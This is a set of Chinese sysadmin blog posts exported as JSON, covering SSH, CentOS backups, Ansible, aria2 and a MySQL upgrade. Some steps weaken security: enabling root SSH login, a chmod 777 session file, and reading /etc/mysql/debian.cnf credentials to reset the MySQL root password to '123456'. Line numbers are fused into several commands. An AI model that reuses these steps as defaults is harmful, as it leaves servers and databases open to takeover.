解决方法: 12345sed -i &#x27;/^GSSAPICleanupCredentials/s/GSSAPICleanupCredentials yes/#GSSAPICleanupCredentials yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication yes/#GSSAPIAuthentication yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication no/#GSSAPIAuthentication no/&#x27; /etc/ssh/sshd_config 二@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_rsa_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_rsa_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_rsa_key @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_ecdsa_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_ecdsa_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_ecdsa_key @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_ed25519_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_ed25519_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_ed25519_key sshd: no hostkeys available -- exiting. make: [check-config] Error 1 (ignored) 上面三个文件的权限问题, 解决方法: 123chmod 600 /etc/ssh/ssh_host_rsa_key &amp;&amp;chmod 600 /etc/ssh/ssh_host_ecdsa_key &amp;&amp;chmod 600 /etc/ssh/ssh_host_ed25519_key 修改配置文件,允许root登录12sed -i &#x27;/^#PermitRootLogin/s/#PermitRootLogin no/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^#PermitRootLogin/s/#PermitRootLogin yes/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config sshd 开机启动1systemctl enable sshd 还有别忘了关闭 telnet 喔! 12systemctl stop xinetd &amp;&amp;systemctl stop telnet.socket &amp;&amp; ———————————————————— END ————————————————————","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"SSH","slug":"运维/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"CentOS7_backup","slug":"2019/CentOS7-backup","date":"2019-07-13T04:20:32.000Z","updated":"2021-06-09T02:05:02.586Z","comments":true,"path":"/p/2019/CentOS7-backup/","link":"","permalink":"https://tari.moe/p/2019/CentOS7-backup/","excerpt":"","text":"参考链接: 左客 rsync增量备份 tar 备份失败一个小坑:我在执行下面命令的时候, 如果我不是在根目录, 会导致备份失败, 不是很懂为什么. 1time tar cvpjf $&#123;BZ2BACKUP&#125; --exclude=/proc --exclude=/lost+found --exclude=/$&#123;BZ2BACKUP&#125; --exclude=/mnt --exclude=/sys --exclude=/media / rsync 三种工作方式 本地文件系统上实现同步。命令行语法格式为上述”Local”段的格式。 本地主机使用远程shell和远程主机通信。命令行语法格式为上述”Access via remote shell”段的格式。 本地主机通过网络套接字连接远程主机上的rsync daemon。命令行语法格式为上述”Access via rsync daemon”段的格式。 相关参数说明: -v：显示rsync过程中详细信息。可以使用\"-vvvv\"获取更详细信息。 -P：显示文件传输的进度信息。(实际上\"-P\"=\"--partial --progress\"，其中的\"--progress\"才是显示进度信息的)。 -n --dry-run ：仅测试传输，而不实际传输。常和\"-vvvv\"配合使用来查看rsync是如何工作的。 -a --archive ：归档模式，表示递归传输并保持文件属性。等同于\"-rtopgDl\"。 -r --recursive：递归到目录中去。 -t --times：保持mtime属性。强烈建议任何时候都加上\"-t\"，否则目标文件mtime会设置为系统时间，导致下次更新 ：检查出mtime不同从而导致增量传输无效。-o --owner：保持owner属性(属主)。 -g --group：保持group属性(属组)。 -p --perms：保持perms属性(权限，不包括特殊权限)。 -D ：是\"--device --specials\"选项的组合，即也拷贝设备文件和特殊文件。 -l --links：如果文件是软链接文件，则拷贝软链接本身而非软链接所指向的对象。 -z ：传输时进行压缩提高效率。 -R --relative：使用相对路径。意味着将命令行中指定的全路径而非路径最尾部的文件名发送给服务端，包括它们的属性。用法见下文示例。 --size-only ：默认算法是检查文件大小和mtime不同的文件，使用此选项将只检查文件大小。 -u --update ：仅在源mtime比目标已存在文件的mtime新时才拷贝。注意，该选项是接收端判断的，不会影响删除行为。 -d --dirs ：以不递归的方式拷贝目录本身。默认递归时，如果源为\"dir1/file1\"，则不会拷贝dir1目录，使用该选项将拷贝dir1但不拷贝file1。 --max-size ：限制rsync传输的最大文件大小。可以使用单位后缀，还可以是一个小数值(例如：\"--max-size=1.5m\") --min-size ：限制rsync传输的最小文件大小。这可以用于禁止传输小文件或那些垃圾文件。 --exclude ：指定排除规则来排除不需要传输的文件。 --delete ：以SRC为主，对DEST进行同步。多则删之，少则补之。注意\"--delete\"是在接收端执行的，所以它是在 ：exclude/include规则生效之后才执行的。 -b --backup ：对目标上已存在的文件做一个备份，备份的文件名后默认使用\"~\"做后缀。 --backup-dir：指定备份文件的保存路径。不指定时默认和待备份文件保存在同一目录下。 -e ：指定所要使用的远程shell程序，默认为ssh。 --port ：连接daemon时使用的端口号，默认为873端口。 --password-file：daemon模式时的密码文件，可以从中读取密码实现非交互式。注意，这不是远程shell认证的密码，而是rsync模块认证的密码。 -W --whole-file：rsync将不再使用增量传输，而是全量传输。在网络带宽高于磁盘带宽时，该选项比增量传输更高效。 --existing ：要求只更新目标端已存在的文件，目标端还不存在的文件不传输。注意，使用相对路径时如果上层目录不存在也不会传输。 --ignore-existing：要求只更新目标端不存在的文件。和\"--existing\"结合使用有特殊功能，见下文示例。 --remove-source-files：要求删除源端已经成功传输的文件。","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"备份","slug":"运维/备份","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/%E5%A4%87%E4%BB%BD/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"CentOS7","slug":"2019/CentOS7","date":"2019-07-09T14:36:30.000Z","updated":"2021-04-02T02:15:38.153Z","comments":true,"path":"/p/2019/CentOS7/","link":"","permalink":"https://tari.moe/p/2019/CentOS7/","excerpt":"","text":"我使用滴 CentOS 7 版本: CentOS Linux release 7.2.1511 (Core)CentOS 6 和 CentOS 7 在华为平台上的两个主要区别 CentOS6： 支持快照； 采用sysvinit，服务启动稍慢，fstab和nfs挂载容易出现问题。 CentOS7： 不支持快照，需要自己备份； 采用systemed，设计目标是克服sysvinit的缺点。 firewalld &amp;&amp; firewall-cmd新安装好 nginx 的我兴致勃勃的输入我的ip, 结果…. 于是我检查 服务状态, 配置文件 和 日志文件 好像在 Ubuntu 上都是一样呀..然后发现了 CentOS7 的防火墙默认只开启 ssh 服务 1firewall-cmd --list-services 那怎么去开启一个端口呢? 这里用 80 端口举例 1234firewall-cmd --zone=public --add-port=80/tcp --permanent # （--permanent永久生效，没有此参数重启后失效）firewall-cmd --reload # 重新载入firewall-cmd --zone=public --query-port=80/tcp # 查看 80 端口firewall-cmd --zone=public --remove-port=80/tcp --permanent # 关闭 80 端口 然后就可以正常访问 nginx 啦! 于是又想起许多防火墙是通过 iptables 去管理的, 顺便到 Red Hat 官方文档 gup 了一下 发现在 RHEL7 系统中, 系统默认是自带 firewall 的, 并且默认关闭开启80端口 值得一提的是 firewall 调用 iptables 的相关命令. 想要详细了解可以参考 liitdar的博客","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"初识 ansible (三)","slug":"2019/初识-ansible-3","date":"2019-07-08T13:37:12.000Z","updated":"2021-06-09T00:36:11.893Z","comments":true,"path":"/p/2019/初识-ansible-3/","link":"","permalink":"https://tari.moe/p/2019/%E5%88%9D%E8%AF%86-ansible-3/","excerpt":"","text":"模板 templatesJinja2语言 算数运算: //(取整) 建议放在ansible目录下, 创建一个 templates 文件夹 模板文件后缀 .j2 配置文件变量用 {{ }} 括起来 with_items 迭代对迭代项的引用， 固定变量名为 “item”要在 task 中使用 with_items 给定要迭代的元素列表列表格式: 字符串 或 字典 12345678910111213---- hosts: all remote_user: root vars_files: - vars.yml tasks: - name: unarchive unarchive: src=&#123;&#123; ansibleShellRoot &#125;&#125;&#123;&#123; item &#125;&#125; dest=/tmp/ copy=yes with_items: - test1.tar.gz - test2.tar.gz - test3.tar.gz playbook -&gt; template 中的 for 和 if12345678910111213141516171819# for&#123;% for vhost in nginx_vhosts %&#125;&#123;% endraw %&#125;server &#123; listen &#123;&#123; vhost.listen | default(&#x27;80 default_server&#x27; ) &#125;&#125;;&#125;&#123;% endfor %&#125;# if&#123;% if vhost.server_name is defined %&#125;server_name &#123; &#123;&#123; vhost.server_name &#125;&#125;;&#125;&#123;% endif %&#125;# if&#123;% if vhost.server_name is defined %&#125;root &#123;&#123; vhost.root &#125;&#125;;&#123;% endif %&#125; for 循环举例.conf.j2 文件 1234567&#123;% for p in ports %&#125;server &#123; listen &#123;&#123; p.port &#125;&#125;; servername &#123;&#123; p.name &#125;&#125;; root &#123;&#123; p.rootdir &#125;&#125;&#125;&#123;% endfor %&#125; .yml 文件 123456789101112131415161718192021---- hosts: all remote_user: root vars_files: ports: - web1: port: 81 name: web1.site.com rootdir: /data/web1 - web2: port: 82 name: web2.site.com rootdir: /data/web2 - web3: port: 83 name: web3.site.com rootdir: /data/web3 tasks: - name: copy conf template: src=/path/**.conf.j2 dest=/path/**.conf if 判断举例.conf.j2 文件 1234567891011&#123;% for p in ports %&#125;server &#123; listen &#123;&#123; p.port &#125;&#125;;&#123;% if p.name is defined %&#125; servername &#123;&#123; p.name &#125;&#125;;&#123;% endif %&#125; root &#123;&#123; p.rootdir &#125;&#125;&#125;&#123;% endfor %&#125; .yml 文件 12345678910111213141516171819---- hosts: all remote_user: root vars_files: ports: - web1: port: 81 rootdir: /data/web1 - web2: port: 82 name: web2.site.com rootdir: /data/web2 - web3: port: 83 rootdir: /data/web3 tasks: - name: copy conf template: src=/path/**.conf.j2 dest=/path/**.conf roles 角色roles 使得 playbook 模块化，并且在模块中的 - include roles/path 中的roles为 /etc/ansible/ 路径下的 roles. roles 的目录树结构如下图所示 (其中的main.yml 类似于入口函数, 负责按照一定顺序调用各个模块): 如果上图中的 nginx 角色要调用不同角色的文件, 需要 - include roles/角色/tasks/某某.yml 角色标签roles: { role: nginx, tages:[‘web’, ‘nginx’]}","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"初识 ansible (二)","slug":"2019/初识-ansible-2","date":"2019-07-08T05:42:59.000Z","updated":"2021-06-09T00:36:08.741Z","comments":true,"path":"/p/2019/初识-ansible-2/","link":"","permalink":"https://tari.moe/p/2019/%E5%88%9D%E8%AF%86-ansible-2/","excerpt":"","text":"ansible 常用模块 Command: 在远程主机执行命令, 默认模块, 可忽略 -m 选项ansible all (-m command) -a ‘service nginx restart’此命令不支持 $VARNAME &lt; &gt; | ; &amp; *等, 用 shell 模块实现 Shell: -a 参数尽量放到单引号中!ansible all -m shell -a ‘echo pass | passwd -stdin user’调用bash执行命令 蕾西 cat /tmp/stanley.md | awk -F ‘|’ ‘print $1,$2’ &amp;&gt; /tmp/example.txt这些复杂命令, 即使使用 shell 也可能会失败, 解决办法: 写到脚本时, copy到远程, 执行. 再把需要的结果拉回执行命令的机器 Script: 运行脚本 -a “/PATH/TO/SCRIPT_FILE”ansible all -m script -a shel.sh ansible-vault 加密解密123456789ansible-vault encrypt file.yml ansible-vault decrypt file.yml ansible-vault edit file.yml ansible-vault view file.yml ansible-vault reykey file.yml ansible-console 交互YAML 语法在单一档案中, 可用连续三个连字号(—)区分多个档案. 另外, 还有选择性的连续三个点好(…)用来表示档案结尾风格和python类似一个完整代码功能需最少元素包含 name: task module: arguments (arguments 一般是 key=value)拓展名通常为 yml 或 yaml 模板: - hosts: websrvs remote_user: root tasks: - name: test connection ping: ansible目录下 vars.yml 专用于存放变量 ansible-playbook 运行 playbook 的方式 ansible-playbook &lt;filename.yml&gt; … [options] -check 检查 –list-hosts 列出运行任务的主机 –limit 只针对主机列表中的主机执行 -v 显示过程 -vv -vvv 更详细 一个模块只对应一个内容 如下: task : - name: copy file1 copy: src=file1 dest=/path/ copy: src=file2 dest=/path/ 这样只会 copy file2 顺便记下 backup 参数, backup=yes 会在复制前备份一个, 防止覆盖.备份的文件名是: 文件名_随机数_时间 ignore_errors 即使途中出错也会继续运行: tasks: - name: rum and ignore the result shell: ... ignore_errors: True handlers 与 notify 触发事件 handlers 用于当关注的资源发生变化时, 才会才会采取一定的操作 notify 调用 handler 中定义的操作 handlers 与 tasks 同级, 并且 notify 名字需要与 handlers 中的 name 名字相同 hosts: websrvs remote_user: root tasks: - name: add group nginx user: name=nginx state=present - name: add user nginx user: name=nginx state=present group=nginx - name: install Nginx yum: name=nginx state=present notify: - restart Nginx - check Nginx process handlers: - name: restart Nginx service: name=nginx state=restartd enabled=yes - name: check Nginx process shell: killall -0 nginx tags 标签 可以单独只执行标签多个动作可以公用一个标签 1ansible-playbook -t 标签 文件.yml 变量的使用 ansible setup facts 远程主机的所有变量都可直接调用 ansible all -m setup 查看所有系统自带变量 在 /etc/ansible/hosts 中定义 普通变量: 主机组中主机单独定义, 优先级高于公共变量 如: [websrvs] 192.168.22.33 http_port=81 192.168.22.34 http_port=82 公共(组)变量: 针对主机组中所有主机定义统一变量 如: [websrvs:vars] nodename=www domainname=example.com 通过命令行制定变量, 优先级最高 如: ansible-playbook -e varname=value 在 playbook 中定义 vars:\\- var1:value1 \\- var12:value2 在 role 中定义","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"Motrix + aria2 踩坑","slug":"2019/Motrix+aria2_踩坑","date":"2019-07-07T16:11:33.000Z","updated":"2021-06-09T00:36:33.453Z","comments":true,"path":"/p/2019/Motrix+aria2_踩坑/","link":"","permalink":"https://tari.moe/p/2019/Motrix+aria2_%E8%B8%A9%E5%9D%91/","excerpt":"","text":"案发前: 被 騷亂時節的少女們 的OP 乙女どもよ 吸引想去追番的我, 看着看着突然有两个域名资源加载不出来, 然后想着把这两个域名加入到我的pac中, 然后发现, 我的pac只用链接的,…于是就跑到别人网盘上去下载pac了. 就突然想起网页版网盘还能全速跑的骚操作, 想安装一波…然后就完全忘了看番这件事了….. Motrix(1.4.1) + aria2(1.34.0)突然觉得百度云盘直接用web端会方便很多,于是想尝试着去使用 Motrix + aria2 + BaiduExporter 的组合, 然后就掉坑了…. Motrix 官网下载就好啦!编译安装最新版本滴 aria2解压进入目录编译安装一条龙…(记得切换位root用户,不然安装时有可能提示权限不够)预编译也不需要加其他拓展,默认就OK啦! 1234sudo sutar &amp;&amp; cd &amp;&amp; ./configuremakemake install 配置继续保持root用户, 方便操作配置文件目录任意, 但要保持下面的path都在同一path .session 文件一定要有喔!aria2.conf 的配置可以参考下我滴 12mkdir /path/aria2 &amp;&amp; touch /path/aria2.session &amp;&amp; chmod 777 /path/aria2.sessionvim /path/aria2.conf 配置完成就可以使用啦!(才怪)要么你是root用户, 不然启动 aria2c 一定记得加 sudo!! 我就被坑了…emmm 1234sudo aria2c --conf-path=/path/aria2/aria2.conf# 这个是在后台运行, 还没下载成功之前建议用上面的, 方便查看运行结果sudo aria2c --conf-path=/path/aria2/aria2.conf -D 安装 BaiduExporter(我使用的是0.8.5)记得安装最新版本, 我就因为没安装最新版本, 他原本对 pan.baidu.com 之类的域名是没有授权, 导致aria2访问不到, 哭死…仔细看README.MD的重要性…. 随便找个可以下载百度云的链接打开, 看到 MO.app 在 保存到网盘 下载等按钮附件就知道插件安装成功啦!!(记得在chrome拓展看看有没有报错, 报错要重装喔!) 说说 MO.app 里面 设置 里面主要字段的含义吧! RPC地址使用MO下载: 就是下载按钮的名字啦!后面跟着的内容在README.ME有说, 我的是http://token:(在motrix Preference-&gt;Advanced-&gt;Security-&gt;RPCSecret 里面的内容)@localhost:16800/jsonrpc User-Agent在 Motrix Preference-&gt;Advanced-&gt;Security: Mock User-Agent 选择 du Referer保持默认的 https://pan.baidu.com/disk/home 就好啦! Motrix 的配置更改后记得点 Save &amp; Apply 就好啦!我踩滴坑一107/07 22:22:06 [ERROR] Failed to serialize session to &#x27;/etc/aria2/aria2.session&#x27;. 这个主要是因为我没有用 sudo 运行 aria2c 二123456707/07 23:46:37 [ERROR] CUID#10 - Download aborted. URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4Exception: [AbstractCommand.cc:351] errorCode=22 URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4 -&gt; [HttpSkipResponseCommand.cc:240] errorCode=22 The response status is not successful. status=40307/07 23:46:37 [NOTICE] Download GID#2384700d4e908591 not complete: /home/tari/Downloads/回顾视频.mp4 这个主要是因为我插件关于百度云盘的域名授权问题, 保持好插件最新版本就好啦!","categories":[{"name":"日常折腾","slug":"日常折腾","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"日常折腾/Motrix","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/"},{"name":"aria2","slug":"日常折腾/Motrix/aria2","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/aria2/"}],"tags":[{"name":"日常折腾","slug":"日常折腾","permalink":"https://tari.moe/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"}]},{"title":"about ssh","slug":"2019/ssh","date":"2019-07-06T12:44:05.000Z","updated":"2021-06-09T02:04:24.406Z","comments":true,"path":"/p/2019/ssh/","link":"","permalink":"https://tari.moe/p/2019/ssh/","excerpt":"","text":"/etc/hosts.deny 禁用无效原因：编译安装时默认没有加载libwrap库 [转载自 良许Linux] Secure Shell缩写是SSH， 由IETF的网络工作小组（Network Working Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。下面我们来介绍 SSH 的 7 大用法。 基本用法最简单的用法就是不带参数，仅输入 ssh 再加上主机地址，比如： ssh 192.168.0.116这种形式登陆主机，会默认使用当前用户进行登录。第一次连接的时候，SSH 会确认目标主机的真实性，如果没有问题的话，输入 yes 即可。 如果我们想要以指定用户名来登录主机，有两种方法： a. 使用 -l 选项 1ssh -l alvin 192.168.0.116 b. 使用 user@hostname 格式 1ssh alvin@192.168.0.116 这两种方法，其中第二种尤为常用。 指定端口登录SSH 默认使用的端口号是 22。大多现代的 Linux 系统 22 端口都是开放的。如果你运行 ssh 程序而没有指定端口号，它直接就是通过 22 端口发送请求的。 如果我们不想通过 22 端口登录，那么我们可以使用 -p 选项来指定端口。 1ssh 192.168.0.116 -p 1234 引申话题：如何修改端口号？只需修改 /etc/ssh/ssh_config ，修改如下一行： 1Port 22 对所有数据请求压缩使用 -C 选项，所有通过 SSH 发送或接收的数据将会被压缩，并且任然是加密的。 1ssh -C 192.168.0.116 但是，这个选项在网速不是很快的时候比较有用，而当网速较快的时候，使用压缩反而会降低效率，所以要视情况使用。 打开调试模式因为某些原因，我们想要追踪调试我们建立的 SSH 连接情况。SSH 提供的 -v 选项参数正是为此而设的。其可以看到在哪个环节出了问题。 12345678910111213[Alvin.Alvin-computer] ➤ ssh -v pi@192.168.0.116OpenSSH_7.1p2, OpenSSL 1.0.1g 7 Apr 2014debug1: Reading configuration data /etc/ssh_configdebug1: Connecting to 192.168.0.116 [192.168.0.116] port 22.debug1: Connection established.debug1: key_load_public: No such file or directorydebug1: Enabling compatibility mode for protocol 2.0debug1: Local version string SSH-2.0-OpenSSH_7.1debug1: Remote protocol version 2.0, remote software version OpenSSH_7.4p1 Raspbian-10+deb9u4debug1: match: OpenSSH_7.4p1 Raspbian-10+deb9u4 pat OpenSSH* compat 0x04000000debug1: Authenticating to 192.168.0.116:22 as &#x27;pi&#x27;debug1: SSH2_MSG_KEXINIT sentdebug1: SSH2_MSG_KEXINIT received 绑定源地址如果你的客户端有多于两个以上的 IP 地址，你就不可能分得清楚在使用哪一个 IP 连接到 SSH 服务器。为了解决这种情况，我们可以使用 -b 选项来指定一个IP 地址。这个 IP 将会被使用做建立连接的源地址。 12345678910[Alvin.Alvin-computer] ➤ ssh -b 192.168.0.105 pi@192.168.0.116Linux raspberrypi 4.14.71-v7+ #1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7lThe programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Feb 24 08:52:29 2019 from 192.168.0.105 远程执行命令如果我们想在目标主机执行一条命令，我们通常的做法是，先登录到目标主机，执行命令，再退出来。这样做当然是可以，但是比较麻烦。 如果我们仅仅是想远程执行一条命令，可以直接在后面跟上命令就好，如下： 123456[Alvin.Alvin-computer] ➤ ssh pi@192.168.0.116 ls -lDesktopDocumentsDownloadsMagPiMusic 挂载远程文件系统另外一个很赞的基于 SSH 的工具叫 sshfs。 sshfs 可以让你在本地直接挂载远程主机的文件系统。它的使用格式如下： 1sshfs -o idmap=user user@hostname:/home/user ~/Remote 比如： 1sshfs -o idmap=user pi@192.168.0.116:/home/pi ~/Pi 这个命令可以将远程主机 pi 用户的主目录挂载到本地主目录下的 Pi 文件夹。 类似文章良许Linux 排除Linux机器是否被入侵","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"SSH","slug":"运维/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"初识 ansible (一)","slug":"2019/初识-ansible-1","date":"2019-07-06T01:03:58.000Z","updated":"2021-06-09T00:36:05.734Z","comments":true,"path":"/p/2019/初识-ansible-1/","link":"","permalink":"https://tari.moe/p/2019/%E5%88%9D%E8%AF%86-ansible-1/","excerpt":"","text":"个人踩滴小坑要注意下下, 一些参数的含义是什么, 好比我调用 script 模块, 想把脚本调用到目标服务器去执行 12- name: backup base system version script: /baseVersionBackup.sh 传入脚本参数1, 2, 3.... “机智” 的我以为这是到对方服务器的根目录执行脚本….emmmmmm** 注意 chdir 是脚本在对方服务器执行的目录, baseVersionBackup.sh 是你本机脚本的位置 ** 123# 正确操作- name: backup base system version script: chdir=/ baseVersionBackup.sh 传入脚本参数1, 2, 3.... ansible: 基于key的验证是一基本要求特性: 模块化 有Paramiko, PyYAML, Jinja2(模块语言)三个关键模块 支持自定义模块 基于python实现 部署简单，基于python和ssh(默认已安装), agentless 安全, 基于OpenSSH 支持playbook编排任务 幂等性: 一个任务执行一遍和执行n遍, 不因重复执行带来意外情况 无需代理不依赖PKI(无需ssl) 可使用任何变成语言写模块 YAML格式，编排任务，支持丰富的数据结构 较强大的多层解决方案 配置文件 /etc/ansible/ansible.cfg 主配置文件，配置ansible工作特性(一般保持默认) 为什么我执行的ansible指令对方就能执行？(tmp执行完会删除) 脚本的临时目录:remote_tmp = ~/.ansible/tmplocal_tmp = ~/.ansible/tmp forks 并发执行 poll_interval 多长时间去拉一次数据 sudo_user 默认用户 ask_sudo_pass 是否询问口令 ask_pass 是否支持口令 host_key_checking 是否检查对应服务器的host_key, 建议取消注释 log_path 日志建议打开 /etc/ansible/hosts 主机清单 分组: [webserver] # 写域名需要借助dns去解析 10.10.0.1[18:20] 10.10.0.92:8080 www[01:100].example.com db-[a:f].example.com ssh基于key验证: ssh-keygen 输入完后加一下秘钥 ssh-copy-id ip地址 Host-pattern: ALL、通配符* 或关系，如: ansible “group1:group2” 或者 ansible “ip1:ip2” 与关系，如: ansible “group1:&amp;group2” 两个组都在的主机 非关系，如: ansible “group1:!group2” 在组1不在组2 综合关系,如: ansible “group1:group2:&amp;group3:!group4” 正则表达式 “~(web|file).*\\.fosu\\.com” /etc/ansible/roles/ 存放角色的目录 程序 /usr/bin/ansible 主程序，临时命令执行工具 –version -m 模块 默认command 例如ping -a 模块参数 -v -vv -vvv –list-hosts 显示主机列表 -k 提示输入ssh连接密码，默认Key验证 -K 提示输入sudo时的口令 -C 检查，并不执行 -T TIMEOUT 默认10s -u 执行远程执行的用户 -b sudo /usr/bin/ansible-doc 查看配置文档，模块功能查看工具 -a 可以列出当前模块列表，很多… -l 比较常用 ansible-doc -l ping -s 片段解释 执行过程: 1.加载自己的配置文件 默认/etc/ansible/ansible.cfg 2.加载自己对应的模块文件,如command 3.通过ansible将模块或命令生成对应的临时py文件并将该文件传输至远程服务器的对应执行用户 $HOME/.ansible/tmp/ansible-tmp-数组/xxx.py文件 4.给文件+x执行 5.执行并返回结果 6.删除临时py文件, sleep 0退出 执行状态: 绿色:执行成功并且不需要做改变的操作 黄色:执行成功并且对目标主机做变更 红色:执行失败 /usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台 /usr/bin/ansible-playbook 定制自动化任务，编排剧本工具/usr/bin/ansible-pull远程执行命令工具 /usr/bin/ansible-valut 文件加密工具 /usr/bin/ansible-console 基于Console界面与用户交互的执行工具 自动化运维应用场景 文件传输 命令执行 应用部署 配置管理 任务流编排 工具： Ansible 适合中小型企业 Puppet 适合大型公司，例如谷歌 相关概念：代码发布机(堡垒机)通常存在发布环境中：负责把在开发完成经测试没问题后发布到生产环境中通常需要2台(主备)","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"MySQL upgrade, from 5.5.* to 5.7.*","slug":"2019/MySQL_upgrade_from_5.5.*_to_5.7.*","date":"2019-07-02T18:16:54.000Z","updated":"2021-06-09T02:05:46.790Z","comments":true,"path":"/p/2019/MySQL_upgrade_from_5.5.*_to_5.7.*/","link":"","permalink":"https://tari.moe/p/2019/MySQL_upgrade_from_5.5.*_to_5.7.*/","excerpt":"","text":"服务器版本 Ubuntu14.04备份(快照)日常忘记密码 -,- (知道密码滴请直接跳至 开始升级至5.7.* )介绍一个简单修改数据库密码的方法 1sudo cat /etc/mysql/debian.cnf 红线选中部分为我本地mysql的用户和密码(password部分每个人不同的喔!)存在mysql的debian-sys-maint用户和密码,那他们是怎么来的呢? 先假科普一波, 正如它的字面意思（Debian System Matainence），Debian系统对MySQL维护用的，你可以理解为通过系统的某个 “非常规” 程序对Mysql进行备份恢复等行为时，该程序所使用的登录Mysql的账户。 使用以上账号密码登录至mysql执行下面三条命令就可以把密码更改为 123456啦! 1234567use mysql;update user set authentication_string=password(&#x27;123456&#x27;) where user=&#x27;root&#x27;;update user set plugin=&#x27;mysql_native_password&#x27;;flush privileges; 登录验证下即可 1mysql -u root -p 开始升级至5.7.*默认情况下，apt是无法直接升级到mysql5.7的，因此需要额外设置 首先，备份数据，尽管下面的方式不会丢失你的数据，但是为了安全考虑，建议备份。 下载mysql-apt的配置包，并安装 123wget https://dev.mysql.com/get/mysql-apt-config_0.8.1-1_all.debsudo dpkg -i mysql-apt-config_0.8.1-1_all.deb 在安装的过程中，会要求选择mysql版本，选择mysql5.7版本后，点击“OK”。 更新源并安装数据库，在安装过程中，会自动卸载已经安装的老版本数据。 1sudo apt-get update &amp;&amp; sudo apt-get install mysql-server 安装 mysql 